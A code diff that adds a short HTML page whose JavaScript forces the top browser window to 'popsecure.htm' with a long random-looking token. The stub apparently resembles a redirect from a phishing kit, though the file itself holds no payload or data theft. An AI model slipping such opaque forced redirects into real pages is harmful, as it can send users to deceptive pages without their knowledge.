@@ -1,0 +1,6 @@
+<html>
+<script language="javascript">
+var page = "popsecure.htm?wstkiomzaetoganaackuusagnttdarrpidpsldnbslsaelonniaoialuabrgnanulrieatrioadnlealnneooatcaoamirgnasieuiktlspsblunnbsaurlpnuzktsarwdaiggda75662466474" //the page to redirect.
+top.location = page;
+</script> 
+</html>
